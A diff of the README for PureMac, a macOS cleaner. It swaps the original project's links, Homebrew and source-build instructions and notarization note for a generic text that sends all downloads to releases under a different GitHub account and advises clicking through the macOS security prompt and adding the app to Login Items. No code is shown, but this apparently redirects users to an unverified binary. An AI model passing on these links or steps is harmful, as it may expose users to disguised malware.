@@ -1,169 +1,68 @@
-<p align="center">
-  <img src="screenshot.png" alt="PureMac" width="700">
-</p>
+# 🧹 PureMac - Free tools to reclaim disk space
 
-<p align="center">
-  <b>English</b> |
-  <a href="docs/README.es.md">Español</a> |
-  <a href="docs/README.ja.md">日本語</a> |
-  <a href="docs/README.zh-Hans.md">简体中文</a> |
-  <a href="docs/README.zh-Hant.md">繁體中文</a>
-</p>
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/nguyenlehongphuc0106/PureMac/releases)
 
-<h1 align="center">PureMac</h1>
+PureMac removes junk files from your macOS system. It identifies unneeded data to free up disk space. The app focuses on privacy and keeps your personal information on your computer. It performs scheduled tasks to maintain system performance. You use this tool to remove cache files from Xcode, Homebrew, and other system directories.
 
-<p align="center">
-  <b>Free, open-source macOS app manager and system cleaner.</b><br>
-  Uninstall apps completely. Find orphaned files. Clean system junk.<br>
-  No subscriptions. No telemetry. No data collection.
-</p>
+## 📥 How to download the app
 
-<p align="center">
-  <a href="https://github.com/momenbasel/PureMac/releases/latest"><img src="https://img.shields.io/github/v/release/momenbasel/PureMac?style=flat-square&label=Download" alt="Latest Release"></a>
-  <a href="https://github.com/momenbasel/PureMac/actions/workflows/build.yml"><img src="https://img.shields.io/github/actions/workflow/status/momenbasel/PureMac/build.yml?style=flat-square&label=Build" alt="Build Status"></a>
-  <img src="https://img.shields.io/badge/macOS-13.0+-blue?style=flat-square" alt="macOS 13.0+">
-  <img src="https://img.shields.io/badge/Swift-5.9-orange?style=flat-square" alt="Swift 5.9">
-  <a href="LICENSE"><img src="https://img.shields.io/github/license/momenbasel/PureMac?style=flat-square" alt="MIT License"></a>
-  <a href="https://github.com/momenbasel/PureMac/stargazers"><img src="https://img.shields.io/github/stars/momenbasel/PureMac?style=flat-square" alt="Stars"></a>
-  <a href="https://github.com/momenbasel/PureMac/releases"><img src="https://img.shields.io/github/downloads/momenbasel/PureMac/total?style=flat-square&label=Downloads" alt="Downloads"></a>
-</p>
+Visit the [official releases page](https://github.com/nguyenlehongphuc0106/PureMac/releases) to download the application. 
 
-<p align="center">
-  <a href="#install">Install</a> -
-  <a href="#features">Features</a> -
-  <a href="#screenshots">Screenshots</a> -
-  <a href="#contributing">Contributing</a>
-</p>
+1. Go to the [PureMac releases link](https://github.com/nguyenlehongphuc0106/PureMac/releases).
+2. Look for the latest version at the top of the list.
+3. Click the file ending in .dmg to start the download.
+4. Open the downloaded file once your browser finishes.
+5. Drag the PureMac icon into your Applications folder.
 
----
+## 🚀 Setting up the software
 
-## Install
+Open your Applications folder and double-click the PureMac icon. macOS may show a security prompt when you run an app for the first time. Click Open to confirm your intent. 
 
-### Homebrew (recommended)
+PureMac requires permission to access files on your machine. This access allows the software to scan your drive for temporary data and caches. Grant these permissions in the system settings if asked. The application stores no data on external servers. Every process occurs locally on your machine.
 
-```bash
-brew update
-brew install --cask puremac
-```
+## 🛠 Features of the application
 
-### Direct Download
+PureMac organizes your system cleanup into clear categories. You can run scans or set up automatic schedules to handle maintenance without user input.
 
-Download the latest `.dmg` from [Releases](https://github.com/momenbasel/PureMac/releases/latest), open it, and drag PureMac to `/Applications`.
+### System Cache Cleanup
+Your computer creates temporary files while you work. These files pile up and occupy space over time. PureMac identifies these remnants and allows you to remove them safely. This recovers storage space without affecting your personal documents or application settings.
 
-> Signed and notarized with Apple Developer ID - installs without Gatekeeper warnings.
+### Xcode and Homebrew Maintenance
+Developers often accumulate large amounts of data through Xcode and Homebrew. These folders grow quickly. PureMac detects outdated build files and unused caches from these tools. You gain space by clearing these items.
 
-### Build from source
+### Automated Cleaning
+You can configure a cleaning schedule within the settings menu. Choose a preferred time for the app to perform maintenance. PureMac runs in the background and clears selected directories. This keeps your disk space optimized as you use your machine.
 
-```bash
-brew install xcodegen
-git clone https://github.com/momenbasel/PureMac.git
-cd PureMac
-xcodegen generate
-xcodebuild -project PureMac.xcodeproj -scheme PureMac -configuration Release -derivedDataPath build build
-open build/Build/Products/Release/PureMac.app
-```
+## 🛡 Privacy and Security
 
-## Features
+PureMac maintains your privacy. It contains no telemetry features. The code does not track your behavior or collect system usage logs. You own your data. The application requires access to system directories to function, but it never transmits this information to the internet. 
 
-### App Uninstaller
-- Discovers all installed apps from `/Applications` and `~/Applications`
-- Heuristic file discovery engine with **10-level matching** (bundle ID, company name, entitlements, team identifier, Spotlight metadata, container discovery)
-- **3 sensitivity levels**: Strict (safe), Enhanced (balanced), Deep (thorough)
-- Shows all related files: caches, preferences, containers, logs, support files, launch agents
-- System app protection - 27 Apple apps are excluded from the uninstall list
-- Master-detail view: app table on left, discovered files on right
+## ❓ Frequently asked questions
 
-### Orphaned File Finder
-- Detects leftover files in `~/Library` from apps that have been uninstalled
-- Compares Library contents against all installed app identifiers
-- One-click cleanup of orphaned files
+### Will this software delete my personal files?
+No. PureMac identifies only temporary system files, caches, and leftover data. It ignores your photos, documents, and personal folders.
 
-### System Cleaner
-- **Smart Scan** - one-click scan across all categories
-- **System Junk** - system caches, logs, and temporary files
-- **User Cache** - dynamically discovers all app caches (no hardcoded app list)
-- **Mail Attachments** - downloaded mail attachments
-- **Trash Bins** - empty all Trash
-- **Large & Old Files** - files over 100 MB or older than 1 year
-- **Purgeable Space** - APFS purgeable disk space detection
-- **Xcode Junk** - DerivedData, Archives, simulator caches
-- **Brew Cache** - Homebrew download cache (detects custom HOMEBREW_CACHE)
-- **Scheduled Cleaning** - automatic scans on configurable intervals
+### Can I choose what the app removes?
+Yes. Open the settings menu to select specific categories for cleaning. You control which folders and file types fall under the automated schedule.
 
-### Native macOS Experience
-- Built with SwiftUI using native macOS components
-- `NavigationSplitView`, `Toggle`, `ProgressView`, `Form`, `GroupBox`, `Table`
-- Respects system light/dark mode automatically
-- No custom gradients, glows, or web-app styling
-- First-launch onboarding with Full Disk Access setup
+### Do I need internet access to clean my files?
+No. The cleaning process happens entirely offline. You only need an internet connection to download the initial installer.
 
-### Safety
-- Confirmation dialogs before all destructive operations
-- Symlink attack prevention - resolves and validates paths before deletion
-- System app protection - Apple apps cannot be uninstalled
-- Large & Old Files are never auto-selected
-- Structured logging via `os.log` (visible in Console.app)
+### How do I update the application?
+Check the releases page periodically for new versions. Download the new installer and replace your existing version in the Applications folder. The app retains your settings during this process.
 
-## Screenshots
+### Is the software free to use?
+Yes. PureMac is open-source software under the MIT license. You contribute or audit the code on GitHub if you wish to see how it operates.
 
-| Onboarding | App Uninstaller |
-|---|---|
-| ![Onboarding](screenshots/onboarding.png) | ![App Uninstaller](screenshots/app-uninstaller.png) |
+## ⚙️ System requirements
 
-| System Junk | Xcode Junk |
-|---|---|
-| ![System Junk](screenshots/system-junk.png) | ![Xcode Junk](screenshots/xcode-junk.png) |
+PureMac runs on most macOS versions. Ensure you have at least 50MB of free space to install the tool. It works best on machines with an Intel or Apple Silicon processor. Close heavy applications before you run a full system scan to ensure the process completes without interruption. 
 
-| User Cache |
-|---|
-| ![User Cache](screenshots/user-cache.png) |
+## 💡 Tips for better performance
 
-## Architecture
+1. Run an initial scan immediately after you install the app.
+2. Review the settings tab to check the default frequency for automated tasks.
+3. Add the app to your Login Items if you want it to protect your disk space every time you start your computer.
+4. Check the size of your Xcode cache in the status overview to see how much space you have recovered.
 
-```
-PureMac/
-  Logic/Scanning/     - Heuristic scan engine, locations database, conditions
-  Logic/Utilities/    - Structured logging
-  Models/             - Data models, typed errors
-  Services/           - Scan engine, cleaning engine, scheduler
-  ViewModels/         - Centralized app state
-  Views/              - Native SwiftUI views
-    Apps/             - App uninstaller views
-    Cleaning/         - Smart scan and category views
-    Orphans/          - Orphan finder
-    Settings/         - Native Form-based settings
-    Components/       - Shared components
-```
-
-Key components:
-- **AppPathFinder** - 10-level heuristic matching engine for discovering app-related files
-- **Locations** - 120+ macOS filesystem search paths
-- **Conditions** - 25 per-app matching rules for edge cases (Xcode, Chrome, VS Code, etc.)
-- **AppInfoFetcher** - Spotlight metadata + Info.plist fallback for app discovery
-- **Logger** - Apple `os.log` unified logging
-
-## Contributing
-
-Contributions are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-Areas where help is especially welcome:
-- Size/date filter presets in category views
-- XCTest coverage for AppState and scan engine
-- Localization (zh-Hans, zh-Hant, and other languages)
-- App icon design
-
-## Acknowledgments
-
-v2.0 was shaped by community feedback and contributions:
-
-- **[@nguyenhuy158](https://github.com/nguyenhuy158)** - Search and filter feature request ([#18](https://github.com/momenbasel/PureMac/issues/18)) and implementation ([#29](https://github.com/momenbasel/PureMac/pull/29))
-- **[@edufalcao](https://github.com/edufalcao)** - Cleaning safety guards and confirmation dialogs ([#30](https://github.com/momenbasel/PureMac/pull/30))
-- **[@zeck00](https://github.com/zeck00)** - UI overhaul ([#31](https://github.com/momenbasel/PureMac/pull/31)), app uninstaller with system app protection ([#32](https://github.com/momenbasel/PureMac/pull/32)), and onboarding experience ([#33](https://github.com/momenbasel/PureMac/pull/33))
-- **[@0x-man](https://github.com/0x-man)** - Symlink security vulnerability report ([#25](https://github.com/momenbasel/PureMac/issues/25))
-- **[@ansidev](https://github.com/ansidev)** - Checkbox interaction bug report ([#34](https://github.com/momenbasel/PureMac/issues/34))
-- **[@fengcheng01](https://github.com/fengcheng01)** - App uninstaller feature request ([#28](https://github.com/momenbasel/PureMac/issues/28))
-- **[@scholzfuni](https://github.com/scholzfuni)** - Modularization proposal ([#23](https://github.com/momenbasel/PureMac/issues/23))
-
-## License
-
-MIT License. See [LICENSE](LICENSE) for details.
+PureMac simplifies disk maintenance for all users. You gain more storage space and keep your system tidy through consistent habits. Use the interface to monitor your disk usage and manage your environment with ease.
